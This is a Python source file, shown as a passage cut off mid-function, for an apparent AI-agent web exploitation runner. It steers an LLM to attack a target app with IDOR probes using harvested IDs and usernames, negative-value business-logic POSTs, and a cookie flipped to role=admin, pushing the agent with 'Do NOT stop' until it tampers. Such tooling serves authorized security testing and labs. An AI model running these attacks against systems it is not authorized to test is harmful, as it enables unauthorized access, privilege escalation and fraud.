"""ExecutionRunner — runs exploits and ALWAYS generates a PoC.

This fixes MARL's root cause where PoC was gated behind exploit_mode != "tool_loop"
making it dead code for all normal runs.

Here: PoC is generated unconditionally from Evidence.exchanges after every run,
regardless of how the exploit was driven (LLM tool-loop or scripted steps).
"""
from __future__ import annotations

import json
import logging
import re
from typing import Optional

from ..config import AppConfig
from ..contracts.dossier import BugDossier
from ..contracts.enums import Role
from ..contracts.evidence import Evidence, StateSnapshot
from ..contracts.recon import ReconArtifact
from ..contracts.results import Finding
from ..llm.client import LLMClient
from ..recon.auth import AuthSessionStore
from ..recon.body_store import BodyStore
from ..workspace import RunWorkspace
from .recorder import RecordingHttpClient
from .tool_bridge import ToolBridge, TOOL_DEFINITIONS
from ..prompts.registry import render

log = logging.getLogger("marl3.exec")
_KNOWN_TOOL_NAMES = {spec["function"]["name"] for spec in TOOL_DEFINITIONS}


class ExecutionRunner:
    def __init__(self, llm: LLMClient, cfg: AppConfig, workspace: RunWorkspace) -> None:
        self._llm = llm
        self._cfg = cfg
        self._ws = workspace
        self.last_poc = None  # set after each run(); read by orchestrator

    async def run(
        self,
        dossier: BugDossier,
        recon: ReconArtifact,
        strategy: str,
        success_condition: str = "",
        execution_guide: str = "",
        memory=None,
    ) -> Evidence:
        self._target_url = recon.target_url
        self._recon = recon
        """Execute the exploit strategy and return structured Evidence.

        Always records to Evidence via RecordingHttpClient.
        Always generates a PoC after execution.
        """
        body_store = BodyStore(self._ws.bodies_dir)
        auth_store = AuthSessionStore(self._ws.sessions_json)

        evidence = Evidence(
            bug_id=dossier.id,
            pattern_id=dossier.pattern_id,
            category=dossier.category.value,
            endpoint=dossier.endpoint,
            method=dossier.method,
            session_context=auth_store.label_role_map(),
        )

        recorder = RecordingHttpClient(
            evidence=evidence,
            body_store=body_store,
            auth_store=auth_store,
            timeout_s=self._cfg.execution.http_timeout_s,
            user_agent=self._cfg.execution.user_agent,
        )
        bridge = ToolBridge(
            recorder=recorder,
            body_store=body_store,
            workspace_root=self._ws.root,
            auth_store=auth_store,
            target_url=recon.target_url,
        )

        # Surface the discovered form/param schema for this endpoint so the exec agent
        # uses REAL field names (e.g. to_username, amount) instead of guessing.
        # Also includes JSON API request body schemas observed in recon (not just HTML forms).
        endpoint_schema = _endpoint_schema(recon, dossier.endpoint, body_store)

        # Harvest concrete valid values (product ids, coupon codes, usernames, object ids)
        # so exec stops guessing inputs (e.g. coupon SAVE10, product_id=1, IDOR /…/2).
        # Also includes API URL patterns (path-based vs query-param) discovered in recon.
        known_values = _known_values_text(recon, body_store)

        # Load attack reference for this pattern — walkthrough of how the vulnerability
        # class is exploited, including discovery steps and key field names.
        from ..knowledge.provider import get_provider as _get_playbook
        lab_reference = _get_playbook().solution_for(dossier.pattern_id)

        # #3: load exec memory (prior exec/verifier notes) so execution doesn't repeat mistakes
        exec_memory = ""
        if memory is not None:
            from ..memory.retrieval import ContextRetriever
            exec_memory = ContextRetriever(memory).bundle_for("exec", dossier).render(token_budget=1200)

        # Long-term memory: surface payloads that worked for this pattern on past runs.
        try:
            from ..memory.longterm import get_longterm, render_exec_skills, target_fingerprint
            _lt = get_longterm(self._cfg)
            if _lt.enabled:
                _q = f"{dossier.pattern_id} {dossier.method} {dossier.endpoint} {dossier.hypothesis}"
                _fp = target_fingerprint(recon) if recon else ""
                _skills = render_exec_skills(
                    _lt.skills_for_exec(dossier.pattern_id, fingerprint=_fp, query_text=_q))
                if _skills:
                    execution_guide = (execution_guide + "\n\n" + _skills).strip()
        except Exception as _e:
            log.debug(f"exec skills lookup skipped: {_e}")

        # Precompute the concrete BLF manipulation payload (real form fields + a real
        # recipient pulled from recon) so both the LLM plan and the deterministic
        # fallback use the same ready-to-send body.
        blf_payload = (
            _blf_full_payload(recon, dossier, body_store)
            if dossier.category.value == "BLF" else None
        )

        try:
            # Run LLM tool-loop exploit
            did_tamper = await self._llm_tool_loop(
                dossier=dossier,
                strategy=strategy,
                success_condition=success_condition,
                auth_store=auth_store,
                bridge=bridge,
                evidence=evidence,
                blf_payload=blf_payload,
                endpoint_schema=endpoint_schema,
                known_values=known_values,
                execution_guide=execution_guide,
                exec_memory=exec_memory,
                lab_reference=lab_reference,
                tool_surface=_tool_surface(),
                max_steps=_max_steps_for(dossier),
            )

            # Deterministic BLF fallback: if the LLM never issued the tampering POST,
            # the runner performs baseline-read → manipulate → re-read itself so the
            # proof-gate has real data to evaluate (no silent BLF failure).
            if dossier.category.value == "BLF" and not did_tamper and blf_payload:
                await self._deterministic_blf_attempt(dossier, recorder, blf_payload)

            # Deterministic cookie-tamper safety-net for BAC-02: the LLM frequently mangles
            # the Cookie header (e.g. 'dangnosuy=role=admin' instead of 'role=admin'), so a
            # genuinely vulnerable endpoint scores 403. Replay normal vs role=admin cookie
            # correctly so the gate's cookie-diff can fire. Gate still needs PRIVILEGED_ACCESS,
            # so a non-admin page never becomes EXPLOITED from this alone.
            # BAC-06 (forced browsing) must NOT trigger this — it's a different attack shape
            # (just navigate to the URL) and probing /admin instead of the dossier's target
            # poisons the evidence with wrong-endpoint exchanges.
            if dossier.pattern_id == "BAC-02":
                await self._deterministic_bac02_attempt(dossier, recorder, auth_store)

            # BLF: capture state_before/after if relevant
            if dossier.category.value == "BLF":
                self._capture_blf_state(evidence)

            # NOTE: proof evaluation (ProofGate + LLM classifier) has been moved to
            # the verify phase so the VerifierPanel can run as a pre-gate sanity check
            # BEFORE the expensive ProofGate classifier is invoked. Evidence is returned
            # with state_delta set (for BLF) but verdict_status intentionally unset.

        finally:
            await recorder.close()
            await bridge.close()

        # PoC always generated — unconditionally (Burp-style HTTP dump)
        self.last_poc = self._generate_poc(evidence, recon.target_url, body_store)

        return evidence

    async def _llm_tool_loop(
        self,
        dossier: BugDossier,
        strategy: str,
        success_condition: str,
        auth_store: AuthSessionStore,
        bridge: ToolBridge,
        evidence: Evidence,
        blf_payload: Optional[dict] = None,
        endpoint_schema: str = "",
        known_values: str = "",
        execution_guide: str = "",
        exec_memory: str = "",
        lab_reference: str = "",
        tool_surface: str = "",
        max_steps: int = 12,
    ) -> bool:
        """Run the exec tool-loop. Returns True if a BLF tampering POST was recorded."""
        # Expose session cookies so the agent can perform cookie-tampering exploits
        session_cookies: dict[str, str] = {}
        for p in auth_store.all_profiles():
            if p.cookie_header:
                session_cookies[p.label] = p.cookie_header
        system_prompt = render(
            "exec_system",
            bug=dossier,
            strategy=strategy,
            success_condition=success_condition,
            sessions=auth_store.label_role_map(),
            session_cookies=session_cookies,
            target_url=getattr(self, "_target_url", ""),
            endpoint_schema=endpoint_schema,
            known_values=known_values,
            execution_guide=execution_guide,
            exec_memory=exec_memory,
            lab_reference=lab_reference,
            tool_surface=tool_surface,
        )

        # BLF needs an ACTIVE manipulation (POST a bad value), not just page reads.
        # Build a concrete, target-specific plan and force the loop to keep steering
        # until a tampering POST is actually recorded — otherwise state_delta / the
        # proof-gate fallback never fire and every BLF bug silently fails.
        is_blf = dossier.category.value == "BLF"
        is_chain = _is_chain(dossier)
        is_value_tamper = is_blf and not is_chain
        # Steering plan: a chain follows the dossier's ordered approach; a value-tamper BLF
        # follows the concrete negative-value plan; everything else is unguided.
        if is_chain:
            plan = _chain_plan_text(dossier)
        elif is_value_tamper:
            plan = _blf_plan_text(dossier, blf_payload or {})
        else:
            plan = ""

        first_user = "Begin execution."
        if plan:
            first_user += "\n\n" + plan
        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": first_user},
        ]
        did_tamper = False
        action_paths: set[str] = set()  # distinct state-changing endpoints hit (chain progress)
        from urllib.parse import urlparse as _urlparse
        from .. import logging_setup as _ls

        def _needs_more() -> bool:
            # Don't let exec quit early: a value-tamper needs its bad-value POST; a chain
            # needs at least two distinct state-changing requests (ordered steps).
            if is_value_tamper:
                return not did_tamper
            if is_chain:
                return len(action_paths) < 2
            return False

        for step in range(max_steps):
            response = await self._llm.chat(
                messages=_windowed(messages, keep_recent=8),
                role=Role.EXEC,
                temperature=0.3,
                max_tokens=2048,
            )
            messages.append({"role": "assistant", "content": response})

            # Check for tool calls (simple text-based parsing for OpenAI function-call style)
            tool_calls = _extract_tool_calls(response)
            if not tool_calls:
                # Don't accept "done" until the required action(s) actually happened:
                # a value-tamper POST, or ≥2 ordered requests for a chain.
                if plan and _needs_more() and step < max_steps - 1:
                    nudge = ("Do NOT stop — you have not performed the required tampering POST yet."
                             if is_value_tamper else
                             "Do NOT stop — the chain is incomplete; continue the remaining ordered steps.")
                    messages.append({"role": "user", "content": f"{nudge} {plan}"})
                    continue
                log.debug(f"{dossier.id}: exec finished after {step+1} steps, {len(evidence.exchanges)} exchanges")
                evidence.notes = response
                break

            tool_results = []
            for tc in tool_calls:
                args = tc["args"]
                # Resolve relative URLs to absolute
                url = args.get("url") or args.get("endpoint") or ""
                if url and url.startswith("/"):
                    target = getattr(self, "_target_url", "")
                    if target:
                        from urllib.parse import urlparse as _up
                        base = f"{_up(target).scheme}://{_up(target).netloc}"
                        args["url"] = base + url
                # Normalize actor key
                if "session" in args and "actor" not in args:
                    args["actor"] = args.pop("session")
                elif "session_label" in args and "actor" not in args:
                    args["actor"] = args.pop("session_label")
                # Normalize method key
                if "method" not in args:
                    args["method"] = "GET"
                # Detect the BLF tampering POST (value-bearing request with out-of-range number)
                _m = args.get("method", "GET").upper()
                if (
                    is_blf
                    and tc["name"] == "http_request"
                    and _m in ("POST", "PUT", "PATCH")
                    and _body_has_bad_value(args.get("body"))
                ):
                    did_tamper = True
                # Track distinct state-changing endpoints for chain progress
                if tc["name"] == "http_request" and _m in ("POST", "PUT", "PATCH", "DELETE"):
                    action_paths.add(_urlparse(args.get("url", "")).path)
                # Show tool call + params before dispatching so the user can follow execution
                _ls.tool_call(dossier.id, step + 1, tc["name"], args)
                result = await bridge.dispatch(tc["name"], args)
                _ls.tool_result(dossier.id, step + 1, tc["name"], str(result))
                tool_results.append(f"[{tc['name']} result]: {result}")

            messages.append({"role": "user", "content": "\n".join(tool_results)})

            # Anti-waste: a chain that has burned several turns with ZERO state-changing
            # requests is stuck reading pages — stop instead of consuming the full budget.
            if is_chain and step >= 7 and not action_paths:
                log.debug(f"{dossier.id}: chain made no state-changing request in {step+1} steps — aborting")
                evidence.notes = "Chain stalled: no state-changing request was issued."
                break

            # Persistent steering: keep pushing until the required action(s) are recorded.
            if plan and _needs_more() and step < max_steps - 1:
                what = ("No tampering POST recorded yet — reading pages is not proof."
                        if is_value_tamper else
                        f"Chain incomplete ({len(action_paths)} state-changing request(s) so far) — keep going.")
                messages.append({"role": "user", "content": f"[Progress check] {what} {plan}"})

        else:
            log.debug(f"{dossier.id}: exec hit max_steps={max_steps}, {len(evidence.exchanges)} exchanges")
            evidence.notes = f"Max steps reached. {len(evidence.exchanges)} exchanges recorded."

        return did_tamper

    async def _deterministic_blf_attempt(self, dossier, recorder, payload: dict) -> None:
        """Runner-driven baseline→manipulate→re-read when the LLM didn't tamper.

        All three requests go through the recorder so they land in Evidence and the
        proof-gate can evaluate them. Best-effort: individual failures are non-fatal.
        """
        attacker = getattr(dossier.auth, "attacker_role", "") or "anon"
        base = getattr(self, "_target_url", "").rstrip("/")
        ep = dossier.endpoint if dossier.endpoint.startswith("/") else "/" + dossier.endpoint
        url = base + ep
        log.info(f"{dossier.id}: deterministic BLF attempt → POST {url} body={payload}")
        for method, label in (("GET", "blf-baseline"), ("POST", "blf-tamper"), ("GET", "blf-reread")):
            try:
                await recorder.request(
                    method=method, url=url, actor=attacker,
                    body=payload if method == "POST" else None, label=label,
                )
            except Exception as e:
                log.warning(f"{dossier.id}: deterministic BLF {method} failed: {e}")

    async def _deterministic_bac02_attempt(self, dossier, recorder, auth_store) -> None:
        """Replay the target endpoint with a correctly-built normal vs role=admin cookie.

        Generic: finds a logged-in profile carrying a plaintext role/is_admin cookie, flips it
        to admin, and issues baseline + tampered GETs through the recorder. No-op when no
        plaintext role cookie exists (BAC-02 then doesn't apply).

        Target selection: prefer an admin/privileged endpoint from recon over dossier.endpoint,
        because hunter often tags BAC-02 to the login endpoint (where the cookie is issued)
        rather than the admin endpoint (where the tampered cookie is *used*). Probing /login
        with a tampered cookie only satisfies AUTH_BYPASS but never PRIVILEGED_ACCESS."""
        base = getattr(self, "_target_url", "").rstrip("/")
        # Prefer an admin/privileged endpoint from recon; fall back to dossier.endpoint.
        _ADMIN_PATTERNS = ("/admin", "/manage", "/staff", "/panel", "/console",
                           "/moderator", "/backend", "/internal", "/superuser")
        recon = getattr(self, "_recon", None)
        admin_ep = None
        if recon is not None:
            for ep_obj in getattr(recon, "endpoints", []):
                ep_path = getattr(ep_obj, "endpoint", "") or ""
                if any(pat in ep_path.lower() for pat in _ADMIN_PATTERNS):
                    admin_ep = ep_path
                    break
        if admin_ep is None:
            ep = dossier.endpoint if dossier.endpoint.startswith("/") else "/" + dossier.endpoint
            admin_ep = ep
        url = base + admin_ep
        prof = next(
            (p for p in auth_store.all_profiles()
             if p.cookie_header and _has_role_cookie(p.cookie_header)), None)
        if not prof:
            return
        tampered, flipped = _tamper_admin_cookie(prof.cookie_header)
        if not flipped:
            return
        log.info(f"{dossier.id}: deterministic BAC-02 cookie-tamper → GET {url}")
        for cookie, label in ((prof.cookie_header, "bac02-baseline"), (tampered, "bac02-tamper")):
            try:
                await recorder.request("GET", url, actor=prof.label,
                                       headers={"Cookie": cookie}, label=label)
            except Exception as e:
                log.warning(f"{dossier.id}: deterministic BAC-02 {label} failed: {e}")

    def _capture_blf_state(self, evidence: Evidence) -> None:
        """For BLF bugs: compute state_delta from before/after exchanges."""
        if len(evidence.exchanges) < 2:
            return
        first = evidence.exchanges[0]
        last = evidence.exchanges[-1]
        delta: dict = {}
        for k, v in last.numeric_fields.items():
            if k.startswith("_"):  # skip internal fields like _resp_len
                continue
            if k in first.numeric_fields and first.numeric_fields[k] != v:
                delta[k] = {"before": first.numeric_fields[k], "after": v}
        evidence.state_delta = delta
        if first.response_body_ref:
            evidence.state_before = StateSnapshot(
                fields=first.numeric_fields,
                exchange_seq=first.seq,
                label="initial_state",
            )
        if last.response_body_ref:
            evidence.state_after = StateSnapshot(
                fields=last.numeric_fields,
                exchange_seq=last.seq,
                label="final_state",
            )

    def _generate_poc(self, evidence: Evidence, target_url: str, body_store: BodyStore):
        from .poc.generator import PocGenerator
        poc_path = self._ws.poc_path(evidence.bug_id)
        gen = PocGenerator(body_store=body_store, workspace_root=self._ws.root)
        return gen.generate(evidence=evidence, target_url=target_url, poc_path=poc_path)


def _endpoint_schema(recon, endpoint: str, body_store=None) -> str:
    """Describe the discovered field schema for an endpoint so exec uses real names.

    Covers three sources in priority order:
      1. HTML forms whose action targets this endpoint (any page)
      2. JSON API POST request bodies observed during recon (for JSON-first apps)
      3. JSON API GET response schema (field names from a real response)

    This makes the schema extraction app-agnostic: works equally for HTML form apps
    and pure JSON API apps (React/Vue SPA + REST backend).
    """
    from urllib.parse import urlparse as _up
    lines: list[str] = []
    target_ep = endpoint.rstrip("/")

    # --- Source 1: static Endpoint registry (form fields from the crawler) ---
    for ep in recon.endpoints:
        if ep.endpoint == endpoint or ep.url.rstrip("/").endswith(endpoint.rstrip("/")):
            if ep.parameters:
                lines.append(f"{ep.method} {ep.endpoint} — form/query fields: {ep.parameters}")

    # --- Source 2: HTML forms from ANY page whose action points to this endpoint ---
    seen_combos: set[str] = set()
    for ex in recon.exchanges:
        if not ex.forms:
            continue
        for form in ex.forms:
            action = form.get("action", "") or ""
            try:
                action_path = _up(action).path.rstrip("/") if action else ""
            except Exception:
                action_path = ""
            if action_path == target_ep or ex.endpoint.rstrip("/") == target_ep:
                names = [f["name"] for f in form.get("fields", [])]
                if not names:
                    continue
                method = form.get("method", "get").upper()
                enctype = form.get("enctype", "").lower()
                ct_hint = (" [Content-Type: application/json]" if "json" in enctype
                           else " [Content-Type: application/x-www-form-urlencoded]")
                combo = f"{method}:{action or ex.endpoint}:{','.join(names)}"
                if combo not in seen_combos:
                    seen_combos.add(combo)
                    lines.append(
                        f"Form: action={action or ex.endpoint} method={method} "
                        f"fields={names}{ct_hint}"
                    )

    # --- Source 3: JSON API — extract request body keys from POST/PUT/PATCH in recon ---
    # This fires when no HTML form was found (pure JSON API). Reading the actual POST bodies
    # that the crawler recorded gives us the exact field names the endpoint expects.
    if body_store is not None:
        seen_json_schemas: set[str] = set()
        for ex in recon.exchanges:
            if ex.endpoint.rstrip("/") != target_ep:
                continue
            if ex.method.upper() not in ("POST", "PUT", "PATCH"):
                continue
            if not ex.request_body_ref:
                continue
            try:
                obj = body_store.get_json(ex.request_body_ref.blob_id)
                if isinstance(obj, dict) and obj:
                    keys = sorted(obj.keys())
                    schema_key = ",".join(keys)
                    if schema_key not in seen_json_schemas:
                        seen_json_schemas.add(schema_key)
                        lines.append(
                            f"JSON API — observed {ex.method.upper()} body fields: {keys} "
                            f"[Content-Type: application/json]"
                        )
            except Exception:
                pass

        # --- Source 4: JSON API GET response schema (field names from a real response) ---
        # When exec hits an endpoint that returns [] (empty), it can't tell the data shape.
        # Surface the schema from any non-empty response to the same endpoint family so exec
        # knows what fields to expect (e.g. orders have {id, user_id, total, status}).
        for ex in recon.exchanges:
            ep_fam = ex.endpoint.rstrip("/")
            # Match this endpoint OR its {id}-parameterised sibling (/orders vs /orders/{id})
            if ep_fam != target_ep and ep_fam != target_ep + "/{id}":
                continue
            if ex.status not in range(200, 300):
                continue
            if not ex.response_body_ref:
                continue
            try:
                obj = body_store.get_json(ex.response_body_ref.blob_id)
                item = None
                if isinstance(obj, dict) and obj:
                    item = obj
                elif isinstance(obj, list) and obj and isinstance(obj[0], dict):
                    item = obj[0]
                if item:
                    resp_keys = list(item.keys())[:12]
                    lines.append(
                        f"JSON API — GET {ex.endpoint} response fields: {resp_keys}"
                    )
                    break
            except Exception:
                pass

    return "\n".join(dict.fromkeys(lines)) if lines else ""


def _api_url_patterns(recon, body_store) -> list[str]:
    """Discover how this app addresses individual resources in its API.

    Scans recon exchanges for:
      - Path-based IDs: /api/v1/users/2 → template /api/v1/users/{id}
      - Query-param IDs: /api/v1/orders?user_id=2

    Returns a list of human-readable lines describing access patterns and known IDs,
    suitable for injection into the exec prompt so the agent doesn't guess URL format.

    This is app-agnostic: it discovers from actual traffic, not hardcoded patterns.
    """
    from urllib.parse import parse_qs, urlparse as _up

    # path-based: endpoint_template → set of seen IDs
    path_based: dict[str, list[str]] = {}
    # query-param-based: (endpoint, param_name) → set of seen values
    query_based: dict[tuple, list[str]] = {}
    # response schemas: endpoint → list of field names
    response_schemas: dict[str, list[str]] = {}

    _ID_PARAM_RE = re.compile(r'(?:user_id|order_id|product_id|item_id|[a-z]+_id|^id$)', re.I)

    for ex in (getattr(recon, "exchanges", []) or []):
        ep = getattr(ex, "endpoint", "") or ""
        url = getattr(ex, "url", "") or ""

        # Path-based: endpoint family has {id}
        if "{id}" in ep:
            if ep not in path_based:
                path_based[ep] = []
            id_val = (getattr(ex, "id_fields", {}) or {}).get("path_id")
            if id_val and str(id_val) not in path_based[ep]:
                path_based[ep].append(str(id_val))
            # Capture response schema for this template
            if ep not in response_schemas and ex.response_body_ref and body_store:
                try:
                    obj = body_store.get_json(ex.response_body_ref.blob_id)
                    item = obj if isinstance(obj, dict) else (
                        obj[0] if isinstance(obj, list) and obj and isinstance(obj[0], dict) else None
                    )
                    if item:
                        response_schemas[ep] = list(item.keys())[:10]
                except Exception:
                    pass

        # Query-param-based: URL has ?user_id=... or similar
        try:
            params = parse_qs(_up(url).query, keep_blank_values=False)
        except Exception:
            params = {}
        for k, vals in params.items():
            if _ID_PARAM_RE.match(k):
                key = (ep, k)
                if key not in query_based:
                    query_based[key] = []
                for v in vals:
                    if v and v not in query_based[key]:
                        query_based[key].append(v)

    if not path_based and not query_based:
        return []

    lines: list[str] = ["API access patterns observed in recon (use these — do NOT guess URL format):"]

    # Infer API family convention from path-based patterns seen
    # e.g. if /api/v1/users/{id} is path-based, assume /api/v1/orders/{id} also works
    api_prefixes: set[str] = set()
    for template in path_based:
        parts = template.split("/")
        if len(parts) >= 4:  # e.g. ["", "api", "v1", "users", "{id}"]
            prefix = "/".join(parts[:4])  # /api/v1/users → /api/v1
            api_prefixes.add("/".join(parts[:3]))  # /api/v1

    for template, ids in sorted(path_based.items())[:8]:
        example = template.replace("{id}", ids[0]) if ids else template.replace("{id}", "N")
        id_list = ids[:6]
        schema = response_schemas.get(template, [])
        schema_str = f" — fields: {schema[:6]}" if schema else ""
        lines.append(
            f"  {template} — path-based. "
            f"Example: GET {example}. Known IDs: {id_list}{schema_str}"
        )

    for (ep, param), vals in sorted(query_based.items())[:4]:
        lines.append(
            f"  {ep}?{param}=N — query-param-based. "
            f"Example: GET {ep}?{param}={vals[0] if vals else 'N'}. Seen values: {vals[:6]}"
        )

    # If we observed path-based IDs for some /api/* endpoints, warn that other /api/*
    # endpoints likely follow the same convention — exec should try /{id} first.
    if api_prefixes:
        lines.append(
            f"  Convention: this app's API ({', '.join(sorted(api_prefixes))}) uses "
            f"path-based IDs. For endpoints where no {'{id}'} was seen in recon "
            f"(e.g. empty lists), try GET /<endpoint>/<id> with the IDs listed above."
        )

    return lines


_BLF_MONEY_KW = (
    "amount", "price", "total", "cost", "balance", "credit", "point", "sum", "value",
    "fee", "charge", "rate", "subtotal", "grand_total", "unit_price", "line_total",
    "tariff", "fare", "deposit", "refund", "net", "gross",
)
_BLF_QTY_KW = (
    "qty", "quantity", "count", "stock", "num", "items",
    "units", "pieces", "seats", "tickets", "licenses",
)
_BLF_IDENTITY_KW = (
    "to_", "recipient", "receiver", "username", "user", "account", "email", "name",
    "payee", "beneficiary", "destination", "target_user",
)
_BLF_SKIP_KW = ("password", "passwd", "csrf", "token", "captcha")
_BLF_REDIRECT_KW = (
    "redir", "redirect", "return", "next", "return_url", "returnurl",
    "back", "success_url", "cancel_url", "callback", "goto", "after",
)


_USERNAME_FIELDS = (
    "username", "user_name", "login", "login_name", "handle",
    "name", "display_name", "screen_name", "email",
)


def _known_usernames(recon, body_store) -> list[str]:
    """Pull real usernames from recon JSON bodies (e.g. an exposed /users list).

    Checks multiple field name conventions so this works on apps that don't use
    'username' — e.g. 'login', 'handle', 'display_name', 'email'.
    """
    names: list[str] = []
    if recon is None or body_store is None:
        return names
    for ex in recon.exchanges:
        if not ex.response_body_ref:
            continue
        json_keys_lower = {k.lower() for k in (ex.json_keys or [])}
        if not any(f in json_keys_lower for f in _USERNAME_FIELDS):
            continue
        try:
            obj = body_store.get_json(ex.response_body_ref.blob_id)
        except Exception:
            continue
        items = obj if isinstance(obj, list) else (
            obj.get("data") if isinstance(obj, dict) and isinstance(obj.get("data"), list) else
            [obj] if isinstance(obj, dict) else []
        )
        for it in items:
            if not isinstance(it, dict):
                continue
            for field in _USERNAME_FIELDS:
                val = it.get(field)
                if val and isinstance(val, str) and "@" not in val:  # skip raw emails as username
                    names.append(val)
                    break
    return list(dict.fromkeys(names))


_CODE_HINT = ("coupon", "promo", "discount", "voucher", "code")
_CODE_STOP = {"HTTP", "HTTPS", "HTML", "JSON", "POST", "DOCTYPE", "UTF", "NULL",
              "TRUE", "FALSE", "DELETE", "PATCH"}


def _known_values(recon, body_store) -> dict:
    """Harvest concrete, valid input values seen in recon so exec uses real data
    (product ids, coupon codes, usernames, object ids) instead of guessing them.

    Also tracks IDs by their source endpoint so the exec prompt can say
    "user IDs [1,2,3] from /api/v1/users" instead of a flat anonymous list.
    """
    usernames = _known_usernames(recon, body_store)
    product_ids: list[int] = []
    product_prices: dict[int, float] = {}  # id → price
    object_ids: list[int] = []
    coupon_codes: list[str] = []
    # endpoint_ids: maps endpoint_template → list of IDs seen in its JSON response
    # Lets exec say "try /orders/5" because it saw id=5 in the /orders response,
    # not just "try some random ID from anywhere"
    endpoint_ids: dict[str, list[int]] = {}
    if recon is not None and body_store is not None:
        for ex in recon.exchanges:
            if not ex.response_body_ref:
                continue
            ctype = ex.response_headers.get("content-type", "")
            if "json" in ctype:
                try:
                    obj = body_store.get_json(ex.response_body_ref.blob_id)
                except Exception:
                    continue
                items = obj if isinstance(obj, list) else (
                    obj.get("data") if isinstance(obj, dict) and isinstance(obj.get("data"), list)
                    else [obj] if isinstance(obj, dict) else [])
                ep_l = (ex.endpoint or "").lower()
                ep_template = ex.endpoint or ""
                for it in items:
                    if not isinstance(it, dict):
                        continue
                    _id = it.get("id")
                    if isinstance(_id, int) and not isinstance(_id, bool):
                        object_ids.append(_id)
                        # Track which endpoint this ID came from (for labeled output)
                        if ep_template and _id not in endpoint_ids.get(ep_template, []):
                            endpoint_ids.setdefault(ep_template, []).append(_id)
                        if "price" in it or "product" in ep_l:
                            product_ids.append(_id)
                            # Extract price for checkout-chain budget awareness
                            price_val = it.get("price") or it.get("unit_price")
                            if isinstance(price_val, (int, float)) and price_val > 0:
                                product_prices[_id] = float(price_val)
            elif "html" in ctype:
                try:
                    text = body_store.get(ex.response_body_ref.blob_id).decode("utf-8", "replace")
                except Exception:
                    continue
                # product IDs rendered in listings ("ID: 3", "data-product-id=3")
                for pid in re.findall(r"(?i)\b(?:product[_-]?id|id)\b[\"'>: =]{1,3}(\d{1,6})", text):
                    product_ids.append(int(pid))
                # coupon/discount codes near a hint word (ALL-CAPS alnum tokens)
                for m in re.finditer(r"(?i)(coupon|promo|discount|voucher|code)", text):
                    for tok in re.findall(r"\b[A-Z][A-Z0-9]{3,}\b", text[m.start():m.end() + 80]):
                        if tok not in _CODE_STOP:
                            coupon_codes.append(tok)
                # HTML price extraction — language/locale agnostic, no currency symbol.
                # Matches formatted numbers regardless of locale or currency:
                #   "1,337.00"  "1.337,00"  "1 337"  "99.99"  "1337.00"  "1.337.000"
                # Works for VND (1.337.000), IDR, KRW, GBP, USD — no currency symbol needed.
                # Pair each price with the nearest product_id found in the same page.
                pids_in_page = [int(p) for p in re.findall(
                    r"(?i)\bproduct[_-]?id\b[\"'>: =]{1,3}(\d{1,6})", text)]
                _price_re = re.compile(
                    r'\b(\d{1,7}(?:[,. ]\d{3})+(?:[,.]\d{1,2})?'  # 1,337 / 1.337 / 1 337
                    r'|\d{1,7}[,.]\d{2})\b'                         # 99.99 / 99,99
                )
                for pm in _price_re.finditer(text):
                    raw = pm.group(1)
                    # Detect decimal vs thousands: separator followed by exactly 2 digits = decimal
                    last_sep_idx = max(raw.rfind(","), raw.rfind("."), raw.rfind(" "))
                    if last_sep_idx != -1 and len(raw) - last_sep_idx - 1 == 2:
                        integer_part = raw[:last_sep_idx].replace(",", "").replace(".", "").replace(" ", "")
                        normalized = integer_part + "." + raw[last_sep_idx + 1:]
                    else:
                        normalized = raw.replace(",", "").replace(".", "").replace(" ", "")
                    try:
                        price_val = float(normalized)
                    except ValueError:
                        continue
                    if 1 <= price_val <= 1_000_000 and pids_in_page:
                        product_prices[pids_in_page[-1]] = price_val
    return {
        "usernames": list(dict.fromkeys(usernames))[:8],
        "product_ids": list(dict.fromkeys(product_ids))[:8],
        "product_prices": product_prices,
        "object_ids": sorted(set(object_ids))[:12],
        "coupon_codes": list(dict.fromkeys(coupon_codes))[:8],
        "endpoint_ids": {k: v[:8] for k, v in endpoint_ids.items()},
    }


def _known_values_text(recon, body_store) -> str:
    """Render harvested known-good values as a prompt section for exec.

    Goes beyond a flat ID list — tells exec WHERE each ID came from and HOW to
    construct the correct URL for this app (path-based vs query-param). This is
    what prevents the exec agent from guessing /orders/{id} vs /orders?user_id=N.
    """
    kv = _known_values(recon, body_store)
    lines: list[str] = []
    if kv["usernames"]:
        lines.append(f"- Real usernames (use as transfer recipients / for IDOR): {kv['usernames']}")
    if kv["product_ids"]:
        lines.append(f"- Valid product IDs (for cart/checkout): {kv['product_ids']}")
    if kv.get("product_prices"):
        prices = kv["product_prices"]
        cheapest_id = min(prices, key=prices.get)
        cheapest_price = prices[cheapest_id]
        price_list = ", ".join(f"id={pid}→${pr:.2f}" for pid, pr in sorted(prices.items(), key=lambda x: x[1]))
        lines.append(f"- Product prices: {price_list}")
        lines.append(f"  ↳ CHEAPEST for checkout chains: product_id={cheapest_id} (${cheapest_price:.2f})")
    if kv["coupon_codes"]:
        lines.append(f"- Valid coupon/discount codes: {kv['coupon_codes']}")

    # Labeled IDs by source endpoint — exec knows WHICH endpoint produced which IDs.
    # Critical for IDOR: "user IDs 1-5 from /api/v1/users" is far more actionable than
    # a flat "[1, 2, 3, 4, 5]" that could come from any resource type.
    endpoint_ids = kv.get("endpoint_ids", {})
    if endpoint_ids:
        lines.append("- Resource IDs by endpoint (use these for IDOR — do NOT invent IDs):")
        for ep_template, ids in sorted(endpoint_ids.items())[:6]:
            lines.append(f"  {ep_template}: IDs {ids[:8]}")
    elif kv["object_ids"]:
        # Fallback: flat list when endpoint labeling wasn't possible
        lines.append(f"- Observed resource IDs (try as path params for IDOR, e.g. /resource/<id>): "
                     f"{kv['object_ids']}")

    # API URL patterns: tells exec HOW to address resources on THIS app.
    # Without this, exec guesses between /orders/{id} and /orders?user_id=N.
    api_pattern_lines = _api_url_patterns(recon, body_store)
    if api_pattern_lines:
        lines.extend(api_pattern_lines)

    return "\n".join(lines)


def _observed_field_value(recon, field_name: str) -> str:
    """Observe a concrete value for any field from captured recon traffic.

    Scans three sources in order of reliability:
      1. HTML form hidden field defaults (most specific — app explicitly set this value)
      2. URL query parameters on any recorded exchange (shows real values the app uses)
    This is app-agnostic: works for redir=CART, return=/dashboard, next=/transactions,
    lang=vi, or any other enum field the server requires.
    """
    if recon is None:
        return ""
    fn_l = field_name.lower()
    # 1. HTML form hidden field default values (e.g. <input type="hidden" name="redir" value="CART">)
    for ex in getattr(recon, "exchanges", []) or []:
        for form in getattr(ex, "forms", []) or []:
            for f in form.get("fields", []):
                if f.get("name", "").lower() == fn_l:
